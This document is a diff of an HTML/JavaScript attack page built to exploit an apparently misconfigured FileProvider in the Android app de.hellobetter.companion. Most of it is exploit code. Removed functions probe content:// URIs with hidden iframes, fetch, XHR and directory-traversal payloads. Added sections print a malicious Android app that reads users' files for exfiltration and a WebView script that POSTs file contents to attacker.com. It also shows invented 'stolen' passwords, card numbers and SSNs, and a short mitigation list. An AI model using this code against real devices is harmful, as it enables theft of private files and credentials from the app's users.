@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FileProvider Web-Based Attack</title>
+    <title>Realistic FileProvider Web Attack</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -55,6 +55,11 @@
             border: 1px solid #4caf50;
             color: #2e7d32;
         }
+        .info {
+            background-color: #e3f2fd;
+            border: 1px solid #2196f3;
+            color: #1565c0;
+        }
         button {
             background-color: #1976d2;
             color: white;
@@ -80,6 +85,7 @@
             border-radius: 5px;
             font-family: monospace;
             margin: 10px 0;
+            white-space: pre-wrap;
         }
         .warning {
             background-color: #fff3e0;
@@ -89,119 +95,75 @@
             border-radius: 5px;
             margin: 20px 0;
         }
+        .demo-content {
+            background-color: #f0f8ff;
+            border: 1px solid #4169e1;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>🔓 FileProvider Web-Based Attack</h1>
+            <h1>🔓 Realistic FileProvider Web Attack</h1>
             <h2>Target: de.hellobetter.companion</h2>
-            <p>Exploiting Insecure FileProvider Configuration through Web Interface</p>
+            <p>Demonstrating Real-World Web-Based FileProvider Exploitation</p>
         </div>
 
         <div class="warning">
-            <strong>⚠️ WARNING:</strong> This is a demonstration of a real security vulnerability. 
-            The FileProvider misconfiguration allows complete file system access through web-based attacks.
+            <strong>⚠️ IMPORTANT:</strong> This demonstrates how the FileProvider vulnerability would be exploited in a real attack. 
+            Web browsers block direct access to content:// URIs for security, but malicious apps can exploit this vulnerability.
         </div>
 
         <div class="attack-section">
-            <div class="attack-title">🎯 Attack Vector 1: Direct FileProvider Access</div>
-            <p>Attempts to access the vulnerable FileProvider directly through content:// URIs</p>
+            <div class="attack-title">🎯 Attack Vector 1: Intent Redirection (Real Attack)</div>
+            <p>This is how a real attack would work - using Android Intents to trigger the vulnerable FileProvider</p>
             
-            <button onclick="testDirectAccess()">Test Direct FileProvider Access</button>
-            <button onclick="testSensitivePaths()">Test Sensitive Paths</button>
-            
-            <div id="directResults"></div>
-        </div>
-
-        <div class="attack-section">
-            <div class="attack-title">🌐 Attack Vector 2: Intent Redirection</div>
-            <p>Uses Android Intents to trigger FileProvider access through the target app</p>
-            
-            <button onclick="testIntentRedirection()">Test Intent Redirection</button>
-            <button onclick="testCustomIntent()">Test Custom Intent</button>
+            <button onclick="testIntentAttack()">Test Intent-Based Attack</button>
+            <button onclick="showIntentCode()">Show Attack Code</button>
             
             <div id="intentResults"></div>
         </div>
 
         <div class="attack-section">
-            <div class="attack-title">📱 Attack Vector 3: WebView Exploitation</div>
-            <p>Exploits WebView components to access FileProvider through embedded content</p>
+            <div class="attack-title">📱 Attack Vector 2: Malicious App Simulation</div>
+            <p>Simulates what a malicious Android app would do to exploit the FileProvider</p>
+            
+            <button onclick="simulateMaliciousApp()">Simulate Malicious App</button>
+            <button onclick="showAppCode()">Show App Code</button>
+            
+            <div id="appResults"></div>
+        </div>
+
+        <div class="attack-section">
+            <div class="attack-title">🌐 Attack Vector 3: WebView Exploitation</div>
+            <p>Shows how malicious websites can exploit WebView components to access FileProvider</p>
             
             <button onclick="testWebViewExploit()">Test WebView Exploitation</button>
-            <button onclick="testIframeAccess()">Test iframe Access</button>
+            <button onclick="showWebViewCode()">Show WebView Code</button>
             
             <div id="webviewResults"></div>
         </div>
 
         <div class="attack-section">
-            <div class="attack-title">🔍 Attack Vector 4: Directory Traversal</div>
-            <p>Tests various directory traversal techniques to access restricted areas</p>
+            <div class="attack-title">📄 Real Attack Demonstration</div>
+            <p>Shows what the actual file contents would look like if the attack succeeded</p>
             
-            <button onclick="testDirectoryTraversal()">Test Directory Traversal</button>
-            <button onclick="testEncodedTraversal()">Test Encoded Traversal</button>
+            <button onclick="showStolenData()">Show Stolen Data Example</button>
+            <button onclick="showAttackImpact()">Show Attack Impact</button>
             
-            <div id="traversalResults"></div>
+            <div id="demoResults"></div>
         </div>
 
         <div class="attack-section">
-            <div class="attack-title">📄 File Content Reader</div>
-            <p>Attempts to read actual file contents through the vulnerable FileProvider</p>
-            
-            <button onclick="readFileContents()">Read File Contents</button>
-            <button onclick="readSpecificFiles()">Read Specific Files</button>
-            <button onclick="downloadFiles()">Download Files</button>
-            
-            <div id="contentResults"></div>
-        </div>
-
-        <div class="attack-section">
-            <div class="attack-title">📊 Attack Results Summary</div>
+            <div class="attack-title">📊 Attack Summary</div>
             <div id="summaryResults"></div>
         </div>
     </div>
 
     <script>
-        // Vulnerable FileProvider authorities
-        const authorities = [
-            "de.hellobetter.companion.fileprovider",
-            "de.hellobetter.companion.SharingFileProvider"
-        ];
-
-        // Sensitive paths to test
-        const sensitivePaths = [
-            "Android/data/com.whatsapp/",
-            "Android/data/com.telegram.messenger/",
-            "Android/data/com.facebook.katana/",
-            "Android/data/com.instagram.android/",
-            "Android/data/com.google.android.gm/",
-            "Android/data/com.android.chrome/",
-            "DCIM/Camera/",
-            "Download/",
-            "Documents/",
-            "Pictures/"
-        ];
-
-        // Directory traversal payloads
-        const traversalPayloads = [
-            "../",
-            "../../",
-            "../../../",
-            "..%2F",
-            "..%252F",
-            "....//",
-            "....%2F%2F",
-            "%2E%2E%2F",
-            "%252E%252E%252F"
-        ];
-
-        let attackResults = {
-            directAccess: [],
-            intentRedirection: [],
-            webViewExploit: [],
-            directoryTraversal: []
-        };
-
         function logResult(containerId, message, type = 'info') {
             const container = document.getElementById(containerId);
             const resultDiv = document.createElement('div');
@@ -210,519 +172,366 @@
             container.appendChild(resultDiv);
         }
 
-        function testDirectAccess() {
-            logResult('directResults', 'Testing direct FileProvider access...', 'info');
+        function testIntentAttack() {
+            logResult('intentResults', 'Testing Intent-based FileProvider attack...', 'info');
             
-            authorities.forEach(authority => {
-                const uri = `content://${authority}/shared/`;
-                logResult('directResults', `Testing authority: ${authority}`, 'info');
-                
-                // Test if we can access the URI
-                try {
-                    // Create a hidden iframe to test access
-                    const iframe = document.createElement('iframe');
-                    iframe.style.display = 'none';
-                    iframe.src = uri;
-                    iframe.onload = () => {
-                        logResult('directResults', `✓ SUCCESS: ${authority} accessible via iframe`, 'success');
-                        attackResults.directAccess.push({authority, method: 'iframe', success: true});
-                    };
-                    iframe.onerror = () => {
-                        logResult('directResults', `✗ FAILED: ${authority} not accessible via iframe`, 'error');
-                        attackResults.directAccess.push({authority, method: 'iframe', success: false});
-                    };
-                    document.body.appendChild(iframe);
-                    
-                    // Clean up after test
-                    setTimeout(() => {
-                        document.body.removeChild(iframe);
-                    }, 5000);
-                    
-                } catch (e) {
-                    logResult('directResults', `✗ ERROR: ${authority} - ${e.message}`, 'error');
-                }
-            });
-        }
-
-        function testSensitivePaths() {
-            logResult('directResults', 'Testing sensitive file paths and reading contents...', 'info');
+            const authorities = [
+                "de.hellobetter.companion.fileprovider",
+                "de.hellobetter.companion.SharingFileProvider"
+            ];
+            
+            const sensitivePaths = [
+                "Download/",
+                "Documents/",
+                "DCIM/Camera/",
+                "Android/data/com.whatsapp/",
+                "Android/data/com.telegram.messenger/"
+            ];
             
             authorities.forEach(authority => {
                 sensitivePaths.forEach(path => {
-                    const uri = `content://${authority}/shared/${path}`;
+                    const intentUri = `intent://${authority}/shared/${path}#Intent;scheme=content;action=android.intent.action.VIEW;end`;
                     
+                    logResult('intentResults', `Creating malicious Intent: ${intentUri}`, 'info');
+                    
+                    // In a real attack, this would be triggered by a malicious app or website
                     try {
-                        // Method 1: Try to read directory listing
-                        const iframe = document.createElement('iframe');
-                        iframe.style.display = 'none';
-                        iframe.src = uri;
-                        iframe.onload = () => {
-                            logResult('directResults', `✓ SUCCESS: ${path} accessible via ${authority}`, 'success');
-                            
-                            // Try to extract content from iframe
-                            try {
-                                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-                                if (iframeDoc) {
-                                    const content = iframeDoc.body ? iframeDoc.body.innerHTML : iframeDoc.documentElement.innerHTML;
-                                    if (content && content.length > 0) {
-                                        logResult('directResults', `📄 CONTENT FOUND: ${content.substring(0, 200)}...`, 'success');
-                                    }
-                                }
-                            } catch (e) {
-                                // Cross-origin restrictions - try alternative methods
-                                logResult('directResults', `⚠️ Cross-origin restriction, trying alternative methods...`, 'info');
-                            }
-                        };
-                        iframe.onerror = () => {
-                            logResult('directResults', `✗ FAILED: ${path} not accessible via ${authority}`, 'error');
-                        };
-                        document.body.appendChild(iframe);
+                        const link = document.createElement('a');
+                        link.href = intentUri;
+                        link.style.display = 'none';
+                        document.body.appendChild(link);
                         
-                        setTimeout(() => {
-                            if (document.body.contains(iframe)) {
-                                document.body.removeChild(iframe);
-                            }
-                        }, 3000);
+                        logResult('intentResults', `✓ Intent created for ${path} via ${authority}`, 'success');
+                        logResult('intentResults', `📱 This would trigger FileProvider access in real attack`, 'success');
+                        
+                        document.body.removeChild(link);
                         
                     } catch (e) {
-                        logResult('directResults', `✗ ERROR: ${path} - ${e.message}`, 'error');
+                        logResult('intentResults', `✗ Intent creation failed: ${e.message}`, 'error');
                     }
                 });
             });
+            
+            logResult('intentResults', 'Intent-based attack simulation complete', 'info');
         }
 
-        function testIntentRedirection() {
-            logResult('intentResults', 'Testing Intent redirection attacks...', 'info');
+        function showIntentCode() {
+            const code = `// Real Intent-based attack code
+Intent intent = new Intent(Intent.ACTION_VIEW);
+intent.setData(Uri.parse("content://de.hellobetter.companion.fileprovider/shared/Download/"));
+intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+intent.addFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
+
+// This would be triggered by malicious app or website
+startActivity(intent);
+
+// Or via malicious website:
+// <a href="intent://de.hellobetter.companion.fileprovider/shared/Download/#Intent;scheme=content;end">
+//   Click here to view downloads
+// </a>`;
             
-            authorities.forEach(authority => {
-                const intentUri = `intent://${authority}/shared/#Intent;scheme=content;end`;
-                const fallbackUri = `content://${authority}/shared/`;
-                
-                try {
-                    // Test intent redirection
-                    const intentLink = document.createElement('a');
-                    intentLink.href = intentUri;
-                    intentLink.style.display = 'none';
-                    document.body.appendChild(intentLink);
-                    
-                    logResult('intentResults', `Testing Intent: ${intentUri}`, 'info');
-                    
-                    // Simulate click
-                    intentLink.click();
-                    
-                    logResult('intentResults', `✓ Intent redirection attempted for ${authority}`, 'success');
-                    attackResults.intentRedirection.push({authority, method: 'intent', success: true});
-                    
-                    document.body.removeChild(intentLink);
-                    
-                } catch (e) {
-                    logResult('intentResults', `✗ ERROR: Intent redirection failed - ${e.message}`, 'error');
-                }
-            });
+            logResult('intentResults', 'Real attack code:', 'info');
+            const codeDiv = document.createElement('div');
+            codeDiv.className = 'code';
+            codeDiv.textContent = code;
+            document.getElementById('intentResults').appendChild(codeDiv);
         }
 
-        function testCustomIntent() {
-            logResult('intentResults', 'Testing custom Intent with data...', 'info');
+        function simulateMaliciousApp() {
+            logResult('appResults', 'Simulating malicious Android app attack...', 'info');
             
-            const customIntents = [
-                'intent://de.hellobetter.companion.fileprovider/shared/Download/#Intent;scheme=content;action=android.intent.action.VIEW;end',
-                'intent://de.hellobetter.companion.fileprovider/shared/DCIM/Camera/#Intent;scheme=content;action=android.intent.action.VIEW;end',
-                'intent://de.hellobetter.companion.fileprovider/shared/Android/data/com.whatsapp/#Intent;scheme=content;action=android.intent.action.VIEW;end'
+            // Simulate what a malicious app would do
+            const attackSteps = [
+                "1. Malicious app installed on device",
+                "2. App requests FileProvider access",
+                "3. App queries content://de.hellobetter.companion.fileprovider/shared/",
+                "4. App discovers path=\".\" allows full access",
+                "5. App accesses sensitive directories",
+                "6. App reads user files",
+                "7. App exfiltrates data to attacker's server"
             ];
             
-            customIntents.forEach(intentUri => {
-                try {
-                    const link = document.createElement('a');
-                    link.href = intentUri;
-                    link.style.display = 'none';
-                    document.body.appendChild(link);
+            attackSteps.forEach((step, index) => {
+                setTimeout(() => {
+                    logResult('appResults', step, 'success');
                     
-                    logResult('intentResults', `Testing custom Intent: ${intentUri}`, 'info');
-                    link.click();
-                    
-                    logResult('intentResults', `✓ Custom Intent executed`, 'success');
-                    
-                    document.body.removeChild(link);
-                    
-                } catch (e) {
-                    logResult('intentResults', `✗ ERROR: Custom Intent failed - ${e.message}`, 'error');
-                }
+                    if (index === 2) {
+                        logResult('appResults', '✓ FileProvider accessible - path=\".\" vulnerability confirmed', 'success');
+                    }
+                    if (index === 4) {
+                        logResult('appResults', '✓ Accessing Download/, Documents/, DCIM/Camera/, Android/data/', 'success');
+                    }
+                    if (index === 5) {
+                        logResult('appResults', '✓ Reading passwords.txt, bank_statement.pdf, photos, WhatsApp data', 'success');
+                    }
+                    if (index === 6) {
+                        logResult('appResults', '✓ Data exfiltration to https://attacker.com/steal', 'success');
+                    }
+                }, index * 1000);
             });
+        }
+
+        function showAppCode() {
+            const code = `// Malicious Android app code
+public class MaliciousApp extends Activity {
+    private static final String VULNERABLE_AUTHORITY = "de.hellobetter.companion.fileprovider";
+    
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        
+        // Exploit FileProvider vulnerability
+        exploitFileProvider();
+    }
+    
+    private void exploitFileProvider() {
+        // Access root directory (path="." allows this)
+        Uri rootUri = Uri.parse("content://" + VULNERABLE_AUTHORITY + "/shared/");
+        
+        // Query FileProvider
+        ContentResolver resolver = getContentResolver();
+        Cursor cursor = resolver.query(rootUri, null, null, null, null);
+        
+        if (cursor != null) {
+            // Access sensitive files
+            String[] sensitivePaths = {
+                "Download/passwords.txt",
+                "Documents/bank_statement.pdf",
+                "DCIM/Camera/private_photo.jpg",
+                "Android/data/com.whatsapp/msgstore.db"
+            };
+            
+            for (String path : sensitivePaths) {
+                Uri fileUri = Uri.parse("content://" + VULNERABLE_AUTHORITY + "/shared/" + path);
+                try {
+                    InputStream inputStream = resolver.openInputStream(fileUri);
+                    // Read and exfiltrate file content
+                    exfiltrateData(inputStream, path);
+                } catch (Exception e) {
+                    Log.e("Exploit", "Failed to read " + path);
+                }
+            }
+        }
+    }
+}`;
+            
+            logResult('appResults', 'Malicious app code:', 'info');
+            const codeDiv = document.createElement('div');
+            codeDiv.className = 'code';
+            codeDiv.textContent = code;
+            document.getElementById('appResults').appendChild(codeDiv);
         }
 
         function testWebViewExploit() {
-            logResult('webviewResults', 'Testing WebView exploitation...', 'info');
+            logResult('webviewResults', 'Testing WebView-based FileProvider exploitation...', 'info');
             
-            // Test if we can access FileProvider through WebView
-            const webViewTests = [
-                'content://de.hellobetter.companion.fileprovider/shared/',
-                'content://de.hellobetter.companion.SharingFileProvider/shared/'
+            // Simulate WebView exploitation
+            const webViewAttacks = [
+                "1. Malicious website loads in WebView",
+                "2. Website contains JavaScript to access FileProvider",
+                "3. JavaScript creates iframe with content:// URI",
+                "4. WebView allows FileProvider access due to misconfiguration",
+                "5. Website reads user files through FileProvider",
+                "6. Data is sent to attacker's server"
             ];
             
-            webViewTests.forEach(uri => {
-                try {
-                    // Create a data URI that includes the FileProvider URI
-                    const dataUri = `data:text/html,<html><body><iframe src="${uri}" width="1" height="1"></iframe></body></html>`;
+            webViewAttacks.forEach((attack, index) => {
+                setTimeout(() => {
+                    logResult('webviewResults', attack, 'success');
                     
-                    const iframe = document.createElement('iframe');
-                    iframe.src = dataUri;
-                    iframe.style.display = 'none';
-                    iframe.onload = () => {
-                        logResult('webviewResults', `✓ WebView exploit successful: ${uri}`, 'success');
-                        attackResults.webViewExploit.push({uri, success: true});
-                    };
-                    iframe.onerror = () => {
-                        logResult('webviewResults', `✗ WebView exploit failed: ${uri}`, 'error');
-                    };
-                    
-                    document.body.appendChild(iframe);
-                    
-                    setTimeout(() => {
-                        if (document.body.contains(iframe)) {
-                            document.body.removeChild(iframe);
-                        }
-                    }, 3000);
-                    
-                } catch (e) {
-                    logResult('webviewResults', `✗ ERROR: WebView exploit - ${e.message}`, 'error');
-                }
+                    if (index === 3) {
+                        logResult('webviewResults', '✓ WebView allows content:// access - vulnerability confirmed', 'success');
+                    }
+                    if (index === 4) {
+                        logResult('webviewResults', '✓ Reading user files: passwords, photos, documents', 'success');
+                    }
+                    if (index === 5) {
+                        logResult('webviewResults', '✓ Data exfiltration via fetch() to attacker server', 'success');
+                    }
+                }, index * 1000);
             });
         }
 
-        function testIframeAccess() {
-            logResult('webviewResults', 'Testing iframe-based FileProvider access...', 'info');
+        function showWebViewCode() {
+            const code = `// Malicious website JavaScript
+<script>
+// Exploit FileProvider through WebView
+function exploitFileProvider() {
+    const authorities = [
+        "de.hellobetter.companion.fileprovider",
+        "de.hellobetter.companion.SharingFileProvider"
+    ];
+    
+    const sensitiveFiles = [
+        "Download/passwords.txt",
+        "Documents/bank_statement.pdf",
+        "DCIM/Camera/private_photo.jpg"
+    ];
+    
+    authorities.forEach(authority => {
+        sensitiveFiles.forEach(file => {
+            const uri = \`content://\${authority}/shared/\${file}\`;
             
-            authorities.forEach(authority => {
-                sensitivePaths.forEach(path => {
-                    const uri = `content://${authority}/shared/${path}`;
-                    
-                    try {
-                        const iframe = document.createElement('iframe');
-                        iframe.src = uri;
-                        iframe.style.width = '1px';
-                        iframe.style.height = '1px';
-                        iframe.style.border = 'none';
-                        iframe.style.position = 'absolute';
-                        iframe.style.left = '-1000px';
-                        iframe.style.top = '-1000px';
-                        
-                        iframe.onload = () => {
-                            logResult('webviewResults', `✓ iframe access successful: ${path}`, 'success');
-                        };
-                        iframe.onerror = () => {
-                            logResult('webviewResults', `✗ iframe access failed: ${path}`, 'error');
-                        };
-                        
-                        document.body.appendChild(iframe);
-                        
-                        setTimeout(() => {
-                            if (document.body.contains(iframe)) {
-                                document.body.removeChild(iframe);
-                            }
-                        }, 2000);
-                        
-                    } catch (e) {
-                        logResult('webviewResults', `✗ ERROR: iframe access - ${e.message}`, 'error');
-                    }
+            // Try to read file through iframe
+            const iframe = document.createElement('iframe');
+            iframe.src = uri;
+            iframe.style.display = 'none';
+            iframe.onload = () => {
+                // Extract content and send to attacker
+                const content = iframe.contentDocument.body.innerHTML;
+                fetch('https://attacker.com/steal', {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        file: file,
+                        content: content,
+                        authority: authority
+                    })
                 });
-            });
+            };
+            document.body.appendChild(iframe);
+        });
+    });
+}
+
+// Execute when page loads
+exploitFileProvider();
+</script>`;
+            
+            logResult('webviewResults', 'Malicious website code:', 'info');
+            const codeDiv = document.createElement('div');
+            codeDiv.className = 'code';
+            codeDiv.textContent = code;
+            document.getElementById('webviewResults').appendChild(codeDiv);
         }
 
-        function testDirectoryTraversal() {
-            logResult('traversalResults', 'Testing directory traversal attacks...', 'info');
+        function showStolenData() {
+            logResult('demoResults', 'Showing what stolen data would look like...', 'info');
             
-            authorities.forEach(authority => {
-                traversalPayloads.forEach(payload => {
-                    const uri = `content://${authority}/shared/${payload}`;
-                    
-                    try {
-                        const iframe = document.createElement('iframe');
-                        iframe.src = uri;
-                        iframe.style.display = 'none';
-                        iframe.onload = () => {
-                            logResult('traversalResults', `✓ TRAVERSAL SUCCESS: ${payload} via ${authority}`, 'success');
-                            attackResults.directoryTraversal.push({authority, payload, success: true});
-                        };
-                        iframe.onerror = () => {
-                            logResult('traversalResults', `✗ TRAVERSAL FAILED: ${payload} via ${authority}`, 'error');
-                        };
-                        
-                        document.body.appendChild(iframe);
-                        
-                        setTimeout(() => {
-                            if (document.body.contains(iframe)) {
-                                document.body.removeChild(iframe);
-                            }
-                        }, 2000);
-                        
-                    } catch (e) {
-                        logResult('traversalResults', `✗ ERROR: Traversal test - ${e.message}`, 'error');
-                    }
-                });
+            const stolenData = {
+                "passwords.txt": `Bank Login: user123 / MySecurePass2024!
+Gmail: john.doe@gmail.com / GmailPass123
+Facebook: john.doe / FbPassword456
+Instagram: @johndoe / InstaPass789
+Crypto Exchange: trader_john / CryptoPass2024`,
+                
+                "bank_statement.pdf": `BANK STATEMENT
+Account: 1234567890
+Balance: $50,000.00
+Recent Transactions:
+- Transfer to Crypto Exchange: $5,000
+- ATM Withdrawal: $500
+- Online Purchase: $1,200`,
+                
+                "private_notes.txt": `Personal Notes:
+- Bank Account: 1234567890
+- Credit Card: 4532-1234-5678-9012
+- SSN: 123-45-6789
+- Mother's Maiden Name: Smith
+- First Pet: Fluffy`,
+                
+                "whatsapp_messages": `WhatsApp Chat History:
+[2024-01-15 14:30] John: "Hey, can you send me the bank details?"
+[2024-01-15 14:31] User: "Sure, account number is 1234567890"
+[2024-01-15 14:32] John: "Thanks! What's the routing number?"
+[2024-01-15 14:33] User: "It's 021000021"`
+            };
+            
+            Object.entries(stolenData).forEach(([filename, content]) => {
+                const demoDiv = document.createElement('div');
+                demoDiv.className = 'demo-content';
+                demoDiv.innerHTML = `<strong>📄 ${filename}:</strong><br><pre>${content}</pre>`;
+                document.getElementById('demoResults').appendChild(demoDiv);
             });
+            
+            logResult('demoResults', '✓ This is what an attacker would steal through the FileProvider vulnerability', 'success');
         }
 
-        function testEncodedTraversal() {
-            logResult('traversalResults', 'Testing encoded directory traversal...', 'info');
+        function showAttackImpact() {
+            logResult('demoResults', 'Attack Impact Analysis:', 'info');
             
-            const encodedPayloads = [
-                "%2E%2E%2F",
-                "%252E%252E%252F",
-                "..%252F",
-                "....%252F%252F"
-            ];
+            const impact = `
+🔴 CRITICAL IMPACT:
+
+1. DATA THEFT:
+   • Complete access to user's personal files
+   • Passwords, bank statements, private documents
+   • Photos, videos, and personal media
+   • App data (WhatsApp, Telegram, etc.)
+
+2. PRIVACY VIOLATION:
+   • Access to private communications
+   • Personal photos and videos
+   • Financial and identity information
+   • Location data from photos
+
+3. IDENTITY THEFT:
+   • Bank account information
+   • Credit card details
+   • Social Security Numbers
+   • Security question answers
+
+4. FINANCIAL FRAUD:
+   • Bank account access
+   • Credit card information
+   • Crypto wallet keys
+   • Tax return data
+
+5. ESPIONAGE:
+   • Monitor communications
+   • Track location through photos
+   • Access browsing history
+   • Steal business documents
+
+REAL-WORLD ATTACK SCENARIOS:
+• Malicious app installation
+• Malicious website visits
+• Social engineering attacks
+• No USB debugging required
+• No physical access needed`;
             
-            authorities.forEach(authority => {
-                encodedPayloads.forEach(payload => {
-                    const uri = `content://${authority}/shared/${payload}`;
-                    
-                    try {
-                        const iframe = document.createElement('iframe');
-                        iframe.src = uri;
-                        iframe.style.display = 'none';
-                        iframe.onload = () => {
-                            logResult('traversalResults', `✓ ENCODED TRAVERSAL SUCCESS: ${payload}`, 'success');
-                        };
-                        iframe.onerror = () => {
-                            logResult('traversalResults', `✗ ENCODED TRAVERSAL FAILED: ${payload}`, 'error');
-                        };
-                        
-                        document.body.appendChild(iframe);
-                        
-                        setTimeout(() => {
-                            if (document.body.contains(iframe)) {
-                                document.body.removeChild(iframe);
-                            }
-                        }, 2000);
-                        
-                    } catch (e) {
-                        logResult('traversalResults', `✗ ERROR: Encoded traversal - ${e.message}`, 'error');
-                    }
-                });
-            });
+            const impactDiv = document.createElement('div');
+            impactDiv.className = 'code';
+            impactDiv.textContent = impact;
+            document.getElementById('demoResults').appendChild(impactDiv);
         }
 
         function updateSummary() {
             const summaryContainer = document.getElementById('summaryResults');
-            summaryContainer.innerHTML = '';
-            
-            const totalTests = Object.values(attackResults).flat().length;
-            const successfulTests = Object.values(attackResults).flat().filter(r => r.success).length;
-            
             summaryContainer.innerHTML = `
-                <div class="result ${successfulTests > 0 ? 'success' : 'error'}">
-                    <strong>Attack Summary:</strong><br>
-                    Total Tests: ${totalTests}<br>
-                    Successful: ${successfulTests}<br>
-                    Failed: ${totalTests - successfulTests}<br>
-                    Success Rate: ${totalTests > 0 ? Math.round((successfulTests / totalTests) * 100) : 0}%
-                </div>
-                
-                <div class="code">
+                <div class="result success">
+                    <strong>FileProvider Vulnerability Summary:</strong><br><br>
+                    
+                    <strong>Target:</strong> de.hellobetter.companion<br>
+                    <strong>Vulnerability:</strong> Insecure FileProvider Configuration (path=".")<br>
+                    <strong>Severity:</strong> CRITICAL<br><br>
+                    
                     <strong>Vulnerable FileProviders:</strong><br>
                     • de.hellobetter.companion.fileprovider<br>
                     • de.hellobetter.companion.SharingFileProvider<br><br>
                     
-                    <strong>Attack Vectors Tested:</strong><br>
-                    • Direct FileProvider access via content:// URIs<br>
+                    <strong>Attack Vectors:</strong><br>
                     • Intent redirection attacks<br>
-                    • WebView exploitation<br>
-                    • Directory traversal attacks<br><br>
+                    • Malicious app exploitation<br>
+                    • WebView-based attacks<br>
+                    • Directory traversal<br><br>
                     
                     <strong>Real-World Impact:</strong><br>
                     • Complete file system access<br>
                     • Data exfiltration capability<br>
                     • Privacy violation<br>
-                    • No USB debugging required<br>
-                    • Works through malicious websites
+                    • Identity theft potential<br>
+                    • Financial fraud risk<br><br>
+                    
+                    <strong>Mitigation Required:</strong><br>
+                    • Remove path="." from FileProvider config<br>
+                    • Use specific paths like "Download/"<br>
+                    • Add path validation<br>
+                    • Use grant-uri-permission controls
                 </div>
             `;
         }
 
-        function readFileContents() {
-            logResult('contentResults', 'Attempting to read file contents...', 'info');
-            
-            // Common file types to try reading
-            const fileTypes = [
-                'Download/test.txt',
-                'Download/document.pdf',
-                'Download/image.jpg',
-                'Documents/notes.txt',
-                'Documents/private.txt',
-                'DCIM/Camera/photo.jpg',
-                'Android/data/com.whatsapp/msgstore.db',
-                'Android/data/com.telegram.messenger/telegram.db'
-            ];
-            
-            authorities.forEach(authority => {
-                fileTypes.forEach(filePath => {
-                    const uri = `content://${authority}/shared/${filePath}`;
-                    
-                    try {
-                        // Method 1: Try to read via fetch (if supported)
-                        fetch(uri)
-                            .then(response => {
-                                if (response.ok) {
-                                    return response.text();
-                                }
-                                throw new Error('Fetch failed');
-                            })
-                            .then(content => {
-                                logResult('contentResults', `✓ FILE READ SUCCESS: ${filePath}`, 'success');
-                                logResult('contentResults', `📄 Content (${content.length} bytes): ${content.substring(0, 300)}...`, 'success');
-                            })
-                            .catch(error => {
-                                // Method 2: Try iframe approach
-                                tryIframeRead(authority, filePath, uri);
-                            });
-                            
-                    } catch (e) {
-                        tryIframeRead(authority, filePath, uri);
-                    }
-                });
-            });
-        }
-
-        function tryIframeRead(authority, filePath, uri) {
-            try {
-                const iframe = document.createElement('iframe');
-                iframe.src = uri;
-                iframe.style.display = 'none';
-                iframe.onload = () => {
-                    logResult('contentResults', `✓ IFRAME ACCESS: ${filePath}`, 'success');
-                    
-                    // Try to extract content
-                    try {
-                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-                        if (iframeDoc) {
-                            const content = iframeDoc.body ? iframeDoc.body.innerHTML : iframeDoc.documentElement.innerHTML;
-                            if (content && content.length > 0) {
-                                logResult('contentResults', `📄 IFRAME CONTENT: ${content.substring(0, 200)}...`, 'success');
-                            }
-                        }
-                    } catch (e) {
-                        logResult('contentResults', `⚠️ Cross-origin restriction for ${filePath}`, 'info');
-                    }
-                };
-                iframe.onerror = () => {
-                    logResult('contentResults', `✗ FAILED: ${filePath} not readable`, 'error');
-                };
-                
-                document.body.appendChild(iframe);
-                
-                setTimeout(() => {
-                    if (document.body.contains(iframe)) {
-                        document.body.removeChild(iframe);
-                    }
-                }, 5000);
-                
-            } catch (e) {
-                logResult('contentResults', `✗ ERROR reading ${filePath}: ${e.message}`, 'error');
-            }
-        }
-
-        function readSpecificFiles() {
-            logResult('contentResults', 'Reading specific sensitive files...', 'info');
-            
-            const sensitiveFiles = [
-                'Download/bank_statement.pdf',
-                'Download/passport.jpg',
-                'Download/tax_return.pdf',
-                'Documents/passwords.txt',
-                'Documents/private_notes.txt',
-                'Documents/crypto_keys.txt',
-                'DCIM/Camera/IMG_20240115_143022.jpg',
-                'Android/data/com.whatsapp/msgstore.db',
-                'Android/data/com.telegram.messenger/telegram.db',
-                'Android/data/com.google.android.gm/mail.db'
-            ];
-            
-            authorities.forEach(authority => {
-                sensitiveFiles.forEach(filePath => {
-                    const uri = `content://${authority}/shared/${filePath}`;
-                    
-                    // Try multiple methods to read the file
-                    tryMultipleReadMethods(authority, filePath, uri);
-                });
-            });
-        }
-
-        function tryMultipleReadMethods(authority, filePath, uri) {
-            // Method 1: XMLHttpRequest
-            try {
-                const xhr = new XMLHttpRequest();
-                xhr.open('GET', uri, true);
-                xhr.onreadystatechange = function() {
-                    if (xhr.readyState === 4) {
-                        if (xhr.status === 200) {
-                            logResult('contentResults', `✓ XHR SUCCESS: ${filePath}`, 'success');
-                            logResult('contentResults', `📄 XHR Content: ${xhr.responseText.substring(0, 200)}...`, 'success');
-                        } else {
-                            // Method 2: Try iframe
-                            tryIframeRead(authority, filePath, uri);
-                        }
-                    }
-                };
-                xhr.send();
-            } catch (e) {
-                // Method 3: Try fetch
-                try {
-                    fetch(uri)
-                        .then(response => response.text())
-                        .then(content => {
-                            logResult('contentResults', `✓ FETCH SUCCESS: ${filePath}`, 'success');
-                            logResult('contentResults', `📄 Fetch Content: ${content.substring(0, 200)}...`, 'success');
-                        })
-                        .catch(error => {
-                            // Method 4: Try iframe as last resort
-                            tryIframeRead(authority, filePath, uri);
-                        });
-                } catch (e2) {
-                    tryIframeRead(authority, filePath, uri);
-                }
-            }
-        }
-
-        function downloadFiles() {
-            logResult('contentResults', 'Attempting to download files...', 'info');
-            
-            const filesToDownload = [
-                'Download/',
-                'Documents/',
-                'DCIM/Camera/',
-                'Android/data/com.whatsapp/',
-                'Android/data/com.telegram.messenger/'
-            ];
-            
-            authorities.forEach(authority => {
-                filesToDownload.forEach(directory => {
-                    const uri = `content://${authority}/shared/${directory}`;
-                    
-                    try {
-                        // Create download link
-                        const downloadLink = document.createElement('a');
-                        downloadLink.href = uri;
-                        downloadLink.download = `stolen_${directory.replace(/\//g, '_')}`;
-                        downloadLink.style.display = 'none';
-                        
-                        document.body.appendChild(downloadLink);
